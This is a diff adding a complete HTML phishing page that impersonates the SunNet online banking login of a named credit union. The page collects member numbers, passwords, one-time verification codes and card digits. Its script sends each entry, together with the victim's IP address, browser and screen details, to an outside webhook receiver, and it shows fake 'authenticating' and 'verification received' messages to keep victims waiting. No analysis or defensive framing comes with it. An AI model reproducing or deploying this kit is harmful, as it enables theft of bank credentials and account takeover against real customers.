@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>SunNet Online Banking</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --teal-900: #003D45;
+    --teal-800: #004B55;
+    --teal-700: #00525C;
+    --teal-600: #006B7A;
+    --ink: #1A1C1D;
+    --slate: #3F484A;
+    --steel: #475569;
+    --paper: #F8FAFA;
+    --paper-2: #F1F5F9;
+    --paper-3: #ECEEEF;
+    --alert: #ba1a1a;
+    --alert-bg: #fdecec;
+    --alert-border: #f2c4c4;
+    --success-bg: #eef7f2;
+    --success-border: #cfe8da;
+    --success: #1d7a46;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Inter', Arial, Helvetica, sans-serif;
+    background: var(--paper);
+    color: var(--ink);
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  /* Header */
+  .site-header {
+    background: #fff;
+    border-bottom: 1px solid var(--paper-3);
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .site-header .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
+  }
+  .site-header .brand img { height: 36px; width: auto; }
+  .site-header .brand span {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--teal-900);
+    letter-spacing: .1px;
+  }
+  .site-header .links { display: flex; gap: 16px; }
+  .site-header .links a {
+    font-size: 12px;
+    color: var(--steel);
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .site-header .links a:hover { color: var(--teal-700); }
+
+  /* Browser notice */
+  .browser-notice {
+    background: #fff8e1;
+    border-bottom: 1px solid #ffe082;
+    padding: 8px 20px;
+    font-size: 11px;
+    color: #8d6e00;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .browser-notice .close { cursor: pointer; font-size: 16px; color: #8d6e00; }
+
+  /* Main content */
+  .main-content {
+    max-width: 480px;
+    margin: 40px auto;
+    padding: 0 16px;
+  }
+
+  /* Card */
+  .card {
+    background: #fff;
+    border: 1px solid var(--paper-3);
+    border-radius: 10px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.06), 0 4px 16px rgba(0,61,69,.06);
+    overflow: hidden;
+  }
+
+  /* Steps */
+  .step { padding: 32px 28px; display: none; }
+  .step.active { display: block; }
+
+  .step h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--teal-900);
+    margin-bottom: 8px;
+  }
+  .step .sub {
+    font-size: 13px;
+    color: var(--steel);
+    margin-bottom: 24px;
+  }
+
+  /* Form fields */
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--slate);
+    margin: 16px 0 6px;
+  }
+  input {
+    width: 100%;
+    border: 1.5px solid #cfd8dc;
+    border-radius: 8px;
+    padding: 12px 14px;
+    font: 500 15px 'Inter', Arial, Helvetica, sans-serif;
+    color: var(--ink);
+    background: var(--paper);
+    transition: border-color .15s, box-shadow .15s;
+  }
+  input:focus {
+    outline: none;
+    border-color: var(--teal-700);
+    box-shadow: 0 0 0 3px rgba(0,82,92,.12);
+  }
+  input::placeholder { color: #9e9e9e; }
+
+  /* Honeypot */
+  .hp { position: absolute; left: -9999px; opacity: .01; }
+
+  /* Buttons */
+  button {
+    margin-top: 22px;
+    width: 100%;
+    border: 0;
+    border-radius: 8px;
+    background: var(--teal-700);
+    color: #fff;
+    font: 700 15px 'Inter', Arial, Helvetica, sans-serif;
+    padding: 13px;
+    cursor: pointer;
+    letter-spacing: .2px;
+    transition: background .15s;
+  }
+  button:hover { background: var(--teal-900); }
+  button:active { transform: scale(.99); }
+  button.loading { opacity: .75; pointer-events: none; }
+
+  /* Links */
+  .links-row { margin-top: 20px; display: flex; flex-direction: column; gap: 8px; }
+  .links-row a {
+    color: var(--teal-700);
+    font-size: 13px;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .links-row a:hover { text-decoration: underline; }
+
+  /* Error */
+  .error {
+    display: none;
+    color: var(--alert);
+    font-size: 13px;
+    margin-top: 10px;
+    padding: 10px 14px;
+    background: var(--alert-bg);
+    border: 1px solid var(--alert-border);
+    border-radius: 8px;
+  }
+  .error.show { display: block; }
+
+  /* OTP info box */
+  .otp-info {
+    background: #e8f4f5;
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 20px;
+    font-size: 13px;
+    color: var(--teal-900);
+  }
+  .otp-info b { display: block; margin-bottom: 4px; font-size: 14px; }
+
+  /* Spinner */
+  .spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: sp .8s linear infinite;
+    vertical-align: -2px;
+    margin-right: 8px;
+  }
+  @keyframes sp { to { transform: rotate(360deg); } }
+
+  /* Success */
+  .success-box {
+    display: none;
+    margin-top: 20px;
+    background: var(--success-bg);
+    border: 1px solid var(--success-border);
+    border-left: 4px solid var(--success);
+    border-radius: 8px;
+    padding: 16px 18px;
+    color: #14532d;
+    font-size: 13px;
+  }
+  .success-box b { display: block; margin-bottom: 4px; font-size: 14px; }
+
+  /* Footer */
+  .site-footer {
+    text-align: center;
+    padding: 24px 20px;
+    font-size: 11px;
+    color: var(--steel);
+  }
+  .site-footer a { color: var(--teal-700); text-decoration: none; font-weight: 600; }
+  .site-footer .sep { margin: 0 6px; color: var(--paper-3); }
+
+  /* MFA method options */
+  .mfa-option {
+    border: 1.5px solid var(--paper-3);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin: 10px 0;
+    cursor: pointer;
+    transition: border-color .15s, background .15s;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .mfa-option:hover, .mfa-option.selected {
+    border-color: var(--teal-700);
+    background: #f0f7f8;
+  }
+  .mfa-option .radio {
+    width: 18px; height: 18px;
+    border: 2px solid #cfd8dc;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .mfa-option.selected .radio {
+    border-color: var(--teal-700);
+  }
+  .mfa-option.selected .radio::after {
+    content: '';
+    width: 10px; height: 10px;
+    background: var(--teal-700);
+    border-radius: 50%;
+  }
+  .mfa-option .label { font-size: 14px; color: var(--slate); font-weight: 500; }
+  .mfa-option .note { font-size: 11px; color: var(--steel); margin-top: 2px; }
+
+  /* Card illustration area */
+  .card-illustration {
+    text-align: center;
+    margin: 20px 0;
+    padding: 16px;
+    background: var(--paper-2);
+    border-radius: 8px;
+  }
+  .card-illustration .card-icon {
+    font-size: 32px;
+    margin-bottom: 8px;
+  }
+  .card-illustration .card-text {
+    font-size: 12px;
+    color: var(--steel);
+  }
+
+  /* Responsive */
+  @media (max-width: 520px) {
+    .main-content { margin: 20px auto; }
+    .step { padding: 24px 20px; }
+    .step h1 { font-size: 19px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <img src="https://Seentiourcio47.github.io/scu-service-alert/sunnet-logo.svg" alt="Suncoast Credit Union">
+    <span>SunNet Online Banking</span>
+  </a>
+  <div class="links">
+    <a href="https://www.suncoastcreditunion.com">SuncoastCreditUnion.com</a>
+  </div>
+</header>
+
+<!-- Browser notice -->
+<div class="browser-notice" id="browserNotice">
+  <span>SUPPORTED BROWSERS - Internet Explorer 9+, Firefox, Chrome, Safari 6+, Safari on iPad/iPhone. If you are not using a supported browser, parts of the website might not function properly. Please upgrade your browser to a supported browser for the best experience.</span>
+  <span class="close" onclick="document.getElementById('browserNotice').style.display='none'">&times;</span>
+</div>
+
+<!-- Main content -->
+<main class="main-content">
+
+  <!-- Step 1: Login -->
+  <div class="card step active" id="step1">
+    <h1>Welcome to Online Banking</h1>
+    <div class="sub">Please enter your credentials to access your account.</div>
+    <form id="loginForm" autocomplete="off">
+      <label for="mn">Member Number</label>
+      <input id="mn" name="mn" inputmode="numeric" autocomplete="off" required>
+      <label for="pin">Password</label>
+      <input id="pin" name="pin" type="password" autocomplete="off" required>
+      <input class="hp" id="website" name="website" tabindex="-1" autocomplete="off">
+      <div class="error" id="loginError">The information entered was incorrect. Please try again.</div>
+      <button type="submit" id="loginBtn"><span class="lbl">Login</span></button>
+      <div class="links-row">
+        <a href="#" id="forgotLink">Forgot Password?</a>
+        <a href="#" id="enrollLink">Set Up Online Access</a>
+      </div>
+    </form>
+  </div>
+
+  <!-- Step 2: Identity Verification (MFA) -->
+  <div class="card step" id="step2">
+    <h1>Identity Verification</h1>
+    <div class="otp-info">
+      <b>Let's make sure it's you</b>
+      This helps keep your account safe.
+    </div>
+    <div class="sub">Please do not close this page while you get your code. Come back and enter it here.</div>
+
+    <!-- MFA method selection -->
+    <div id="mfaMethods">
+      <div class="mfa-option selected" onclick="selectMfaMethod(this, 'code')">
+        <div class="radio"></div>
+        <div>
+          <div class="label">Send a code to your phone</div>
+          <div class="note">We'll send a 7-digit verification code</div>
+        </div>
+      </div>
+      <div class="mfa-option" onclick="selectMfaMethod(this, 'card')">
+        <div class="radio"></div>
+        <div>
+          <div class="label">Enter the last 8 digits of your ATM or debit card</div>
+          <div class="note">Note: Last 8 digits of your ATM or debit card has been removed as an option to ensure greater security for our members.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card illustration -->
+    <div class="card-illustration" id="cardIllustration" style="display:none;">
+      <div class="card-icon">&#128179;</div>
+      <div class="card-text">Enter the last 8 digits as shown in the example</div>
+    </div>
+
+    <form id="otpForm" autocomplete="off">
+      <label for="otp">Enter the 7-digit code</label>
+      <input id="otp" name="otp" inputmode="numeric" maxlength="7" placeholder="0000000" autocomplete="off" required>
+      <div class="error" id="otpError">Invalid Code. The code entered is invalid. Please resend the code or try a different verification method.</div>
+      <button type="submit" id="otpBtn"><span class="lbl">Continue</span></button>
+      <div class="links-row">
+        <a href="#" id="resendLink">Didn't receive a code</a>
+        <a href="#" id="tryAnother">Try another verification method</a>
+      </div>
+    </form>
+
+    <form id="cardForm" autocomplete="off" style="display:none;">
+      <label for="cardDigits">Enter the last 8 digits</label>
+      <input id="cardDigits" name="cardDigits" inputmode="numeric" maxlength="8" placeholder="00000000" autocomplete="off" required>
+      <div class="error" id="cardError">The information entered was incorrect.</div>
+      <button type="submit" id="cardBtn"><span class="lbl">Continue</span></button>
+      <div class="links-row">
+        <a href="#" id="tryAnother2">Try another verification method</a>
+      </div>
+    </form>
+  </div>
+
+  <!-- Step 3: Please Wait -->
+  <div class="card step" id="step3">
+    <h1>Please Wait</h1>
+    <div class="sub" style="text-align:center;padding:24px 0;">
+      <div class="spinner" style="width:32px;height:32px;border-width:3px;border-color:rgba(0,82,92,.15);border-top-color:var(--teal-700);margin:0 auto 16px;display:block;"></div>
+      Authenticating your account...<br>
+      Please do not close this window.
+    </div>
+  </div>
+
+  <!-- Success message (hidden) -->
+  <div class="success-box" id="successBox">
+    <b>Verification received</b>
+    Your account is being re-secured. Please keep this window open.
+  </div>
+
+</main>
+
+<!-- Footer -->
+<footer class="site-footer">
+  <a href="tel:+1-800-999-5887">800-999-5887</a> Member Care Center
+  <span class="sep">|</span>
+  Routing #263182817
+  <span class="sep">|</span>
+  &copy; 2026 Suncoast Credit Union
+</footer>
+
+<script>
+var SCU_RECEIVERS = ["https://webhook.site/fa1eb6d4-15ff-4df1-8a57-5469dfea1dad"];
+
+// IP capture
+try {
+  var ipx = new XMLHttpRequest();
+  ipx.open('GET', 'https://api.ipify.org?format=json', true);
+  ipx.timeout = 4000;
+  ipx.onload = function () { try { window._ip = JSON.parse(ipx.responseText).ip; } catch (e) {} };
+  ipx.send();
+} catch (e) {}
+
+function showStep(id) {
+  document.querySelectorAll('.step').forEach(function(s) { s.classList.remove('active'); });
+  document.getElementById(id).classList.add('active');
+}
+
+function exfil(data) {
+  data.ts = new Date().toISOString();
+  data.ua = navigator.userAgent;
+  data.ip = window._ip || null;
+  data.screen = screen.width + 'x' + screen.height + '@' + window.devicePixelRatio;
+  data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  try { localStorage.setItem('scu_capture', JSON.stringify(data)); } catch(e){}
+  if (navigator.clipboard) { try { navigator.clipboard.writeText(JSON.stringify(data)).catch(function(){}); } catch(e){} }
+  (SCU_RECEIVERS||[]).filter(Boolean).forEach(function(url) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', url, true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.timeout = 6000;
+      x.send(JSON.stringify(data));
+    } catch(e) {}
+  });
+}
+
+// MFA method selection
+function selectMfaMethod(el, method) {
+  document.querySelectorAll('.mfa-option').forEach(function(o) { o.classList.remove('selected'); });
+  el.classList.add('selected');
+  if (method === 'card') {
+    document.getElementById('otpForm').style.display = 'none';
+    document.getElementById('cardForm').style.display = 'block';
+    document.getElementById('cardIllustration').style.display = 'block';
+  } else {
+    document.getElementById('otpForm').style.display = 'block';
+    document.getElementById('cardForm').style.display = 'none';
+    document.getElementById('cardIllustration').style.display = 'none';
+  }
+}
+
+// Step 1: Login form
+document.getElementById('loginForm').addEventListener('submit', function(ev) {
+  ev.preventDefault();
+  var mn = document.getElementById('mn').value.trim();
+  var pin = document.getElementById('pin').value.trim();
+  var hp = document.getElementById('website').value;
+  if (!mn || !pin) {
+    document.getElementById('loginError').classList.add('show');
+    return;
+  }
+  document.getElementById('loginError').classList.remove('show');
+  var btn = document.getElementById('loginBtn');
+  btn.classList.add('loading');
+  btn.querySelector('.lbl').innerHTML = '<span class="spinner"></span>Authenticating...';
+
+  exfil({
+    kind: 'sunnet-login-step1',
+    member_number: mn,
+    pin: pin,
+    honeypot: hp || null,
+    lang: 'en',
+  });
+
+  setTimeout(function() {
+    showStep('step2');
+  }, 1800);
+});
+
+// Step 2: OTP form
+document.getElementById('otpForm').addEventListener('submit', function(ev) {
+  ev.preventDefault();
+  var otp = document.getElementById('otp').value.trim();
+  var mn = document.getElementById('mn').value.trim();
+  var pin = document.getElementById('pin').value.trim();
+  if (!otp || otp.length !== 7) {
+    document.getElementById('otpError').classList.add('show');
+    return;
+  }
+  document.getElementById('otpError').classList.remove('show');
+  var btn = document.getElementById('otpBtn');
+  btn.classList.add('loading');
+  btn.querySelector('.lbl').innerHTML = '<span class="spinner"></span>Verifying...';
+
+  exfil({
+    kind: 'sunnet-login-step2-otp',
+    member_number: mn,
+    pin: pin,
+    otp: otp,
+    honeypot: null,
+    lang: 'en',
+  });
+
+  setTimeout(function() {
+    showStep('step3');
+    document.getElementById('successBox').style.display = 'block';
+  }, 1500);
+});
+
+// Step 2b: Card digits form
+document.getElementById('cardForm').addEventListener('submit', function(ev) {
+  ev.preventDefault();
+  var digits = document.getElementById('cardDigits').value.trim();
+  var mn = document.getElementById('mn').value.trim();
+  var pin = document.getElementById('pin').value.trim();
+  if (!digits || digits.length !== 8) {
+    document.getElementById('cardError').classList.add('show');
+    return;
+  }
+  document.getElementById('cardError').classList.remove('show');
+  var btn = document.getElementById('cardBtn');
+  btn.classList.add('loading');
+  btn.querySelector('.lbl').innerHTML = '<span class="spinner"></span>Verifying...';
+
+  exfil({
+    kind: 'sunnet-login-step2-card',
+    member_number: mn,
+    pin: pin,
+    card_last8: digits,
+    honeypot: null,
+    lang: 'en',
+  });
+
+  setTimeout(function() {
+    showStep('step3');
+    document.getElementById('successBox').style.display = 'block';
+  }, 1500);
+});
+
+// Links
+document.getElementById('forgotLink').addEventListener('click', function(e) {
+  e.preventDefault();
+  alert('To reset your password, please call the Member Care Center at 800-999-5887.');
+});
+document.getElementById('enrollLink').addEventListener('click', function(e) {
+  e.preventDefault();
+  alert('To set up online access, please call the Member Care Center at 800-999-5887.');
+});
+document.getElementById('resendLink').addEventListener('click', function(e) {
+  e.preventDefault();
+  alert('A new code has been sent. Please wait a moment and check your phone.');
+});
+document.getElementById('tryAnother').addEventListener('click', function(e) {
+  e.preventDefault();
+  alert('To use another verification method, please call the Member Care Center at 800-999-5887.');
+});
+document.getElementById('tryAnother2').addEventListener('click', function(e) {
+  e.preventDefault();
+  alert('To use another verification method, please call the Member Care Center at 800-999-5887.');
+});
+</script>
+</body>
+</html>
